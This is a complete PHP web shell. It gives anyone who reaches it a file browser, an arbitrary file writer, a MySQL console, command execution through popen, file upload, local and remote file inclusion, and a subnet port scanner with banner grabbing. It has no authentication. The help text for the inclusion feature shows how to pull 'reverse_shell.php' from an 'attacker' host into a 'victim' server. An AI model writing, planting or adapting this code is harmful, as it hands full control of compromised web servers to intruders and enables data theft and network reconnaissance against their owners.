<?
# Date : 07 / 03 / 2022
# Version : 1.0 
# Author: Kalu
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA


?>
<head>
<SCRIPT LANGUAGE="JavaScript" type="text/javascript">

var IB=new Object;
var posX=0;posY=0;
var xOffset=10;yOffset=10;
function AffBulle(texte) {
	contenu="<TABLE border=0 cellspacing=0 cellpadding="+IB.NbPixel+"><TR bgcolor='"+IB.ColContour+"'><TD><TABLE border=0 cellpadding=2 cellspacing=0 bgcolor='"+IB.ColFond+"'><TR><TD><FONT size='-1' face='arial' color='"+IB.ColTexte+"'>"+texte+"</FONT></TD></TR></TABLE></TD></TR></TABLE>&nbsp;";
	var finalPosX=posX-xOffset;
if (finalPosX<0) finalPosX=0;
if (document.layers) {
	document.layers["bulle"].document.write(contenu);
	document.layers["bulle"].document.close();
	document.layers["bulle"].top=posY+yOffset;
	document.layers["bulle"].left=finalPosX;
	document.layers["bulle"].visibility="show";}
	if (document.all) {
		bulle.innerHTML=contenu;
		document.all["bulle"].style.top=posY+yOffset;
		document.all["bulle"].style.left=finalPosX;//f.x-xOffset;
		document.all["bulle"].style.visibility="visible";
	}
	else if (document.getElementById) {
		document.getElementById("bulle").innerHTML=contenu;
		document.getElementById("bulle").style.top=posY+yOffset;
		document.getElementById("bulle").style.left=finalPosX;
		document.getElementById("bulle").style.visibility="visible";
	}
}

function getMousePos(e) {
	if (document.all) {
		posX=event.x+document.body.scrollLeft;
		posY=event.y+document.body.scrollTop;
	}
	else {
		posX=e.pageX;
		posY=e.pageY; 
	}
}

function HideBulle() {
	if (document.layers) {document.layers["bulle"].visibility="hide";}
	if (document.all) {document.all["bulle"].style.visibility="hidden";}
	else if (document.getElementById){document.getElementById("bulle").style.visibility="hidden";}
}

function InitBulle(ColTexte,ColFond,ColContour,NbPixel) {
	IB.ColTexte=ColTexte;IB.ColFond=ColFond;IB.ColContour=ColContour;IB.NbPixel=NbPixel;
	if (document.layers) {
		window.captureEvents(Event.MOUSEMOVE);window.onMouseMove=getMousePos;
		document.write("<LAYER name='bulle' top=0 left=0 visibility='hide'></LAYER>");
	}
	if (document.all) {
		document.write("<DIV id='bulle' style='position:absolute;top:0;left:0;visibility:hidden'></DIV>");
		document.onmousemove=getMousePos;
	}
	else if (document.getElementById) {
		document.onmousemove=getMousePos;
		document.write("<DIV id='bulle' style='position:absolute;top:0;left:0;visibility:hidden'></DIV>");
	}
}

</SCRIPT>
</head>

<body>

<table cellpadding="0" cellspacing="0" border="1" align="center" bgcolor="#BFBFBF" width="100%" frame="border">
<tr>
<td align="center"><a href=?function=browse>Browse</a></td>
<td align="center"><a href=?function=edit&rep=SETFILE_HERE>Edit File</a></td>
<td align="center"><a href=?function=sql>MYSQL request</a></td>
<td align="center"><a href=?function=shell>Shell</a></td>
<td align="center"><a href=?function=upload>Upload File</a></td>
<td align="center"><a href=?function=scan>Ports Scan</a></td>
<td align="center"><a href=?function=include>Call a script</a></td>

</tr>
</table>

<?

$function = $_GET['function'];

//############################# Explorer

if ($function=='browse'){
	$rep = $_GET['rep'];
echo '<br><a href=?function=browse&rep=/>Go to root</a><br>'; 
$cur = @exec('pwd');
if (!$rep) { $rep=$cur ; }
	if (!$rep) { $rep="./" ; }
	$path = "";
	if ($rep == "/") { 
		$path = "<b>/</b>";
	}
	else {
		$count = 0 ;
		$cur = "";
		$tabpath = explode("/",$rep);
		foreach ($tabpath as $elem) {
			if ($count > 0) {
				$cur .= "/".$elem ;
				$path .= "<b> / <a href=?function=browse&rep=".urlencode($cur).">".$elem."</a></b>";
			}
			$count++;
		}
	}
	print "Current path:&nbsp;&nbsp;&nbsp;".$path."<br><br>";

	
	$directory=opendir($rep);
	$tabfolders = array();
	$tabfiles = array();
	
	while (false !== ($file = readdir($directory))) {          
 		if($file != '..' && $file !='.' && $file !=''){
			if ($rep == "/") { $rep = "" ; }
  			if (@is_dir($rep."/".$file)){
	   			array_push($tabfolders,"<b><a href=?function=browse&rep=".urlencode($rep."/".$file).">".$file."</a></b><br>");
   			} else{
   				array_push($tabfiles,"<a href=?function=edit&rep=".$rep."/".$file.">[E]</a>&nbsp;&nbsp;".$file."<br>");	
   			}
   			
   	}
   	
   	}
	if (count($tabfolders) > 0) {
		print "---------------- Folders  ----------------<br>";
		sort ($tabfolders);
		foreach($tabfolders as $folders) { print $folders ; }
	}
	if (count($tabfiles) > 0) {
		print "---------------- Files -------------------<br>";
		print "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[E] Edit the file</b><br>";
		sort ($tabfiles);
		foreach($tabfiles as $files) { print $files ; }
	}
   	
//############################# Edit   	
   	
} elseif($function=='edit'){
	$rep = $_GET['rep'];
	$state = $_POST['state'];
	$edit = $_POST['edit'];
   if ($rep=='SETFILE_HERE'){
   	echo "Set the file name in the URL \$rep=<br>";
   } else{
		if ($state=='write'){
			$Handle = fopen($rep, 'w');
			fwrite($Handle, stripslashes($edit));
			fclose($Handle); 
			print "<font color=gree><b>File Saved</b></font>";
		} else {
			$lines = file($rep);
			foreach ($lines as $line_num => $line) {
				$buffer_file = $buffer_file.$line;
			}
		}
	}
?>
<form action="" method="post" name="editform" enctype="multipart/form-data">
<input type="hidden" name="function" value="edit">
<input type="text" name="rep" value="<? echo $rep ?>">
<input type="text" name="state" value="write"><br>
<textarea name="edit" rows="35" cols="100"><? echo $buffer_file?></textarea><br>
<button type="submit" name="submit">Save</button>
</form>
<SCRIPT>document.editform.rep.focus();document.editform.rep.select();</SCRIPT>
<?

//############################# Include

} elseif($function=='include'){
	
	$file = $_GET['file'];
	if($file == '') { print "Please set the file to include in URL.<BR><BR>Local File Inclusion : http://victim/audit.php?function=include&file=localfile.php<BR>Remote File Inclusion : http://victim/audit.php?function=include&file=http://attacker/reverse_shell.php" ; }
	else {
		include($file);
	}
	
	
//############################# Sql Explorer

} elseif($function=='sql'){
	$host = $_POST['host'];
	$login = $_POST['login'];
	$password = $_POST['password'];
	$db = $_POST['db'];
	$req = $_POST['req'];


	if (empty($host)) { $host='localhost'; }
	

	
	?>
	<br>
<form action="" method="post" name="sqlform" enctype="multipart/form-data">
<input type="hidden" name="function" value="sql">
Host : <input type="text" name="host" value="<? echo $host ?>"><br>
Login : <input type="text" name="login" value="<? echo $login ?>"><br>
Password : <input type="text" name="password" value="<? echo $password ?>"><br>
DB : <input type="text" name="db" value="<? echo $db ?>"><br>
Req : <textarea name="req" rows="5" cols="100">SHOW TABLES;
</textarea><br>
<button type="submit" name="submit">Execute</button>
</form>
<SCRIPT>document.sqlform.login.focus();</SCRIPT>

<?
	if (!empty($password)){
		$db_link = mysql_connect("$host","$login","$password");
		$requete=mysql_db_query("$db",$req,$db_link);
		$result = mysql_query($req);

		if (!$result) {
  			 echo "Erreur DB, impossible de realiser la requete<BR>";
  			 echo 'Erreur MySQL : ' . mysql_error();
  		 exit;
		}
		print "<b>Requ&ecirc;te : <font color=blue>$req</font></b><BR><BR>";
		print "<TABLE BORDER=0 BGCOLOR=lightgrey>";
		while ($row = mysql_fetch_row($result)) {
			print "<TR>";
			for($i = 0; $i < count($row); $i++) {
  		 		print "<TD>$row[$i]</TD>";
			}
			print "</TR>";
		}
		print "</TABLE>";

	}

//############################# Shell

} elseif($function=='shell'){
	$cmd = $_POST['cmd'];
	$history = $_POST['history'];
	$hist = $_POST['hist'];
	$rememberpath = $_POST['rememberpath'];
	$cpath = $_POST['cpath'];
	$hostname = $_POST['hostname'];
?>
<br>
<form action="" method="post" name="shell" enctype="multipart/form-data">
<input type="hidden" name="function" value="shell">
Command line: #!> <input type="text" name="cmd">&nbsp;&nbsp;&nbsp;
<button type="submit" name="submit">Execute</button>&nbsp;&nbsp;&nbsp;<input type=CHECKBOX name="history" value=true <? if ($history == "true") { echo checked ; }; ?>>Keep history&nbsp;&nbsp;&nbsp;<input type=CHECKBOX name="rememberpath" value=true <? if ($rememberpath == "true") { echo checked ; }; ?>>Remember Path
<SCRIPT>document.shell.cmd.focus();</SCRIPT>
<br>

<?
echo "<br>-----------------------------[ SHELL ]-------------------------<br>";
$cmdres = array();

if (!empty($cmd)){
	$oricmd = $cmd ;
	if ($rememberpath == "true") { 
		if (!empty($cpath)) { $cmd = "cd ".$cpath.";".$cmd ; }
	}
	$pipe = popen($cmd.";pwd;hostname" , 'r');
	if (!$pipe) {
		print "command execution failed.";
	}
	else {
		while(!feof($pipe)) {
			$line = fgets($pipe, 1024);
			array_push($cmdres,$line);
		}
		$hostname = array_pop($cmdres);
		$hostname = array_pop($cmdres);
		$curpath = array_pop($cmdres);
		if ($rememberpath == 'true') {
		?>
		<INPUT type=hidden name=cpath value=<? echo $curpath ; ?>>
		<?
		}
	}
	pclose($pipe);
}
function displaycmdres($res) {
	foreach ($res as $line) {
		$result .= $line."<br>" ;
	}
	return $result ;
}

if ($history == 'true') { 
	$hist = "<b>[$hostname:$curpath]\$&nbsp; $oricmd</b><br>".displaycmdres($cmdres)."<br>".$hist 
	?> 
	<INPUT type=hidden name=hist value="<? echo $hist; ?>">
	<?  
	print $hist ;
}
else { print "<b>[$hostname:$curpath]\$&nbsp; $oricmd</b><br>".displaycmdres($cmdres); }
?>
</form>
<?

echo "-----------------------------------------------------------------<br>";

//############################# Upload

} elseif($function=='upload'){
	$myfile2 = $_FILES["myfile2"];
	$MAX_FILE_SIZE = $_POST['MAX_FILE_SIZE'];
	$target = $_POST['target'];

	if (!empty($myfile2)){
		$directorytarget = $target;
    	$targetname = $_FILES["myfile2"]["name"];
    	 if (is_uploaded_file($_FILES["myfile2"]["tmp_name"])) {
        if (rename($_FILES["myfile2"]["tmp_name"],
                   $directorytarget."/".$targetname)) {
            echo "<font color=green><b>Upload Done</b></font>";
        } else {
            echo "Move Error";
       }          
    } else {
       echo "Can't Upload";
    }
}
?>
<br>
<form action="" method="POST" enctype="multipart/form-data">
<input type="hidden" name="function" value="upload">
 <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
Source File : <input type="file" name="myfile2"><br>
Directory on server : <input type="text" name="target"><br>

<button type="submit" name="submit">Upload</button>
</form>
<?


} elseif($function=='scan'){
	$server = $_GET['server'];
	$min = $_GET['min'];
	$max = $_GET['max'];
	$mask = $_GET['mask'];
	$dns = $_GET['dns'];
?>
<SCRIPT language="JavaScript">InitBulle("navy","#BBBBFF","lightgrey",1);
	// InitBulle(couleur de texte, couleur de fond, couleur de contour taille contour)
</SCRIPT>
<br>
<form action="" method="GET" enctype="multipart/form-data">
<input type="hidden" name="function" value="scan">
Port Min :  <input type="text" name="min" value=1 size=6>  Port Max :  <input type="text" name="max" value=1024 size=6>
<br>IP : <input type="text" name="server"> / <input type="text" name="mask" size=2 value=32>&nbsp;&nbsp;&nbsp;<INPUT type=checkbox name=dns value=true <? if ($dns=="true") { echo checked ; } ?>>Name resolution
<br><button type="submit" name="submit">Scan</button>
<br>
<?

	if (!empty($server)){

		trim($server);
		$flagip = 0 ;
		if (ereg ("([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})",$server,$reg)) {
			if (($reg[1] >= 0) && ($reg[1] <= 255) && ($reg[2] >= 0) && ($reg[2] <= 255) && ($reg[3] >= 0) && ($reg[3] <= 255) && ($reg[4] >= 0) && ($reg[4] <= 255)) {
				$flagip = 1 ;
			}
		}
		if (!$flagip) { print "<br>Invalid IP<br>" ; exit ; }	
		if (!$min || $min<0 || $min > 65535) { print "<br>Incorrect value for min port<br>" ; exit ; }
		if (!$max || $max > 65535) { print "<br>Incorrect value for max port<br>" ; exit ; }
		if (!$max || $max<$min) { print "<br>Max port must be greater than min port<br>" ; exit ; }
		if (!(($mask >= 20) && ($mask <=32))) { print "<br>Invalid CIDR value - It must be between 20 and 32<br>" ; exit ; } 

		function dotbin($binin,$cdr_nmask){
			if ($binin=="N/A") return $binin;
			$oct=rtrim(chunk_split($binin,8,"."),".");
			if ($cdr_nmask > 0){
				$offset=sprintf("%u",$cdr_nmask/8) + $cdr_nmask ;
				return substr($oct,0,$offset ) . "&nbsp;&nbsp;&nbsp;" . substr($oct,$offset) ;
			} 
			else {
				return $oct;
			}
		}

		function dqtobin($dqin) {
	        	$dq = explode(".",$dqin);
	        	for ($i=0; $i<4 ; $i++) {
	        		$bin[$i]=str_pad(decbin($dq[$i]), 8, "0", STR_PAD_LEFT);
			}
			return implode("",$bin);
		}

		function binnmtowm($binin){
			$binin=rtrim($binin, "0");
			if (!ereg("0",$binin) ){
				return str_pad(str_replace("1","0",$binin), 32, "1");
			} else return "1010101010101010101010101010101010101010";
		}

		function binwmtonm($binin){
			$binin=rtrim($binin, "1");
			if (!ereg("1",$binin)){
				return str_pad(str_replace("0","1",$binin), 32, "0");
			} else return "1010101010101010101010101010101010101010";
		}

		function bintocdr ($binin){
			return strlen(rtrim($binin,"0"));
		}
		
		function bintodq ($binin) {
			if ($binin=="N/A") return $binin;
				$binin=explode(".", chunk_split($binin,8,"."));
				for ($i=0; $i<4 ; $i++) {
				$dq[$i]=bindec($binin[$i]);
			}
		        return implode(".",$dq) ;
		}

		function cidrtobin ($cidrin){
			return str_pad(str_pad("", $cidrin, "1"), 32, "0");
		}
		
		$bin_host=dqtobin($server);
		$bin_net=(str_pad(substr($bin_host,0,$mask),32,0));
		$bin_bcast=(str_pad(substr($bin_host,0,$mask),32,1));
		$net = bintodq($bin_net);
		$bcast = bintodq($bin_bcast);
		
		print "<br>Scan request: ".bintodq($bin_host)."/".$mask;
		echo "<br> Range: ".$net." - ".$bcast."<br>";
		
		ereg ("([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})",$net,$regnet);
		ereg ("([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})",$bcast,$regbcast);

		$tab_ip = array();
		$tab_sub = array();
		$tab_host = array();
			if ($regnet[3] < $regbcast[3]) {	
				for ($j=$regnet[3];$j<=$regbcast[3];$j++) {
					array_push($tab_sub,$j);
				}
			}
			else {  array_push($tab_sub,$regnet[3]); }
			if ($regnet[4] < $regbcast[4]) {	
				for ($k=$regnet[4];$k<=$regbcast[4];$k++) {
					array_push($tab_ip,$k);
				}
			}
			else {  array_push($tab_ip,$regnet[4]); }

			foreach ($tab_sub as $sub) {
				foreach ($tab_ip as $ip) {
					$host = $regnet[1].".".$regnet[2].".".$sub.".".$ip;
					array_push($tab_host,$host); 
				}
			}

		
		echo "From port : ".$min." to ".$max."<br>"; 
		
		foreach ($tab_host as $server) {
			print "<br><u><b>$server</b></u>"; 
			if ($dns == "true") { print "  (".gethostbyaddr($server).")"; }
			print "<br>" ;
			$timeout = 3 ; // three seconds
	
			for($port=$min;$port<$max;$port++){
	  			$fp=@fsockopen($server,$port,$errno,$errstr,$timeout);
	  			if($fp){
		    			print "Port ";
					if ($port == 80){
						fwrite($fp,"HEAD / HTTP/1.1\r\n\n");
						$conres = fread($fp,1024);
						?>
						<A href="#" onMouseOver="AffBulle('<? print str_replace("\"","_",str_replace("\r\n","\t",$conres)) ; ?>')" onMouseOut="HideBulle()"><? print $port ; ?></A>
						<?
					}
					elseif ($port == 21 || $port == 22 || $port == 25 || $port == 110) {
	                                        $conres = fread($fp,1024);
						?>
						<A href="#" onMouseOver="AffBulle('<? print str_replace("\n"," ",str_replace("\"","_",str_replace("\r\n","\t",$conres))) ; ?>')" onMouseOut="HideBulle()"><? print $port ; ?></A>
						<?
	                                }
					else {
						print $port ;
					}
					print "&nbsp;open<br>\n" ;
	    				fclose($fp);
					ob_flush();
					flush();
					usleep(50000);
	  			}
	  		}
		}
  	}
?>
<br>
<?
}
?>
